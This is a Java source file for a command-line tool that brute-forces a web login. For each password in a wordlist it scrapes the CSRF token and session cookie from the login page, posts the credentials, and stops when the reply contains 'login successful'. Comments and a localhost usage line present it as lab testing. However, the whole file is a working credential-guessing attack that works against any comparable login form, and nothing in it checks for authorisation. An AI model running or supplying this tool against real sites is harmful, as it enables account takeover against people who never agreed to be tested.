import java.io.*;
import java.net.URI;
import java.net.http.*;
import java.net.http.HttpRequest.BodyPublishers;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;

public class BruteClient {
    private final HttpClient client;

    public BruteClient(Duration timeout) {
        this.client = HttpClient.newBuilder()
                .connectTimeout(timeout)
                .followRedirects(HttpClient.Redirect.NORMAL)
                .build();
    }

    public static void main(String[] args) {
        // Simple CLI parsing (no external libs). Accepts: --url, --user, --wordlist, --delay-ms
        Map<String, String> opts = parseArgs(args);
        if (!opts.containsKey("url") || !opts.containsKey("user") || !opts.containsKey("wordlist")) {
            System.err.println("Usage: java BruteClient --url http://localhost:8080 --user testuser --wordlist wordlist.txt [--delay-ms 200]");
            System.exit(2);
        }

        String url = opts.get("url");
        String username = opts.get("user");
        Path wordlist = Paths.get(opts.get("wordlist"));
        long delayMs = Long.parseLong(opts.getOrDefault("delay-ms", "200"));

        BruteClient bc = new BruteClient(Duration.ofSeconds(10));
        try {
            bc.run(wordlist, url, username, delayMs);
        } catch (Exception e) {
            System.err.println("Fatal error: " + e.getMessage());
            e.printStackTrace(System.err);
            System.exit(1);
        }
    }

    public void run(Path wordlist, String baseUrl, String username, long delayMs) throws Exception {
        if (!Files.exists(wordlist)) {
            throw new FileNotFoundException("Wordlist not found: " + wordlist);
        }

        List<String> candidates = Files.readAllLines(wordlist, StandardCharsets.UTF_8);
        if (candidates.isEmpty()) {
            System.out.println("Wordlist is empty.");
            return;
        }

        URI root = URI.create(baseUrl.endsWith("/") ? baseUrl : baseUrl + "/");
        AtomicBoolean found = new AtomicBoolean(false);

        for (String candidate : candidates) {
            if (candidate.trim().isEmpty()) continue;
            String password = candidate.trim();
            try {
                // 1) Fetch login page to obtain CSRF token and cookie
                HttpRequest getReq = HttpRequest.newBuilder()
                        .uri(root)
                        .GET()
                        .timeout(Duration.ofSeconds(10))
                        .header("Accept", "text/html")
                        .build();

                HttpResponse<String> getResp = client.send(getReq, HttpResponse.BodyHandlers.ofString());
                if (getResp.statusCode() != 200) {
                    System.err.println("[WARN] Fetch login page returned status " + getResp.statusCode());
                }

                // extract CSRF token — for demo we look for hidden input or cookie header
                String csrfToken = extractCsrfFromBody(getResp.body());
                String cookie = getResp.headers().firstValue("set-cookie").orElse(null);
                if (csrfToken == null) {
                    System.err.println("[ERROR] Could not find CSRF token in login page; skipping attempt.");
                    continue;
                }

                // 2) Post credentials with CSRF token
                String form = "username=" + urlEncode(username) + "&password=" + urlEncode(password)
                        + "&csrf_token=" + urlEncode(csrfToken);

                HttpRequest.Builder postBuilder = HttpRequest.newBuilder()
                        .uri(root.resolve("/login"))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .header("Accept", "text/plain");

                if (cookie != null) {
                    // send cookie back (server expects cookie with token)
                    String cookieVal = cookie.split(";", 2)[0];
                    postBuilder.header("Cookie", cookieVal);
                }

                HttpRequest postReq = postBuilder.POST(BodyPublishers.ofString(form)).build();

                HttpResponse<String> postResp = client.send(postReq, HttpResponse.BodyHandlers.ofString());

                int status = postResp.statusCode();
                String body = postResp.body();

                String summary = String.format("[TRY] user='%s' pass='%s' => %d : %s", username, password, status, firstLine(body));
                System.out.println(summary);

                if (status == 200 && body.toLowerCase().contains("login successful")) {
                    System.out.println("[FOUND] Credentials valid! user='" + username + "' password='" + password + "'");
                    found.set(true);
                    break; // stop after success
                }

                // polite delay to simulate responsible testing
                Thread.sleep(delayMs);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                throw ie;
            } catch (IOException | RuntimeException ex) {
                // granular exception handling and friendly messages
                System.err.println("[ERROR] Exception while trying password '" + candidate + "': " + ex.getMessage());
                // continue with next candidate unless it was fatal
            }
        }

        if (!found.get()) {
            System.out.println("[RESULT] No valid credentials found in the supplied wordlist.");
        }
    }

    // Helper: extract CSRF token from HTML hidden input
    private static String extractCsrfFromBody(String body) {
        if (body == null) return null;
        // naive regex: look for <input ... name='csrf_token' value='...'>
        Pattern p = Pattern.compile("<input[^>]*name=['\"]?csrf_token['\"]?[^>]*value=['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE);
        Matcher m = p.matcher(body);
        if (m.find()) return m.group(1);
        return null;
    }

    private static String urlEncode(String s) {
        try {
            return java.net.URLEncoder.encode(s, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            return s;
        }
    }

    private static String firstLine(String s) {
        if (s == null) return "";
        int idx = s.indexOf('\n');
        return idx >= 0 ? s.substring(0, idx) : s;
    }

    private static Map<String, String> parseArgs(String[] args) {
        Map<String, String> map = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if (a.startsWith("--")) {
                String key = a.substring(2);
                if (i + 1 < args.length && !args[i + 1].startsWith("--")) {
                    map.put(key, args[i + 1]);
                    i++;
                } else {
                    map.put(key, "true");
                }
            }
        }
        return map;
    }
}
v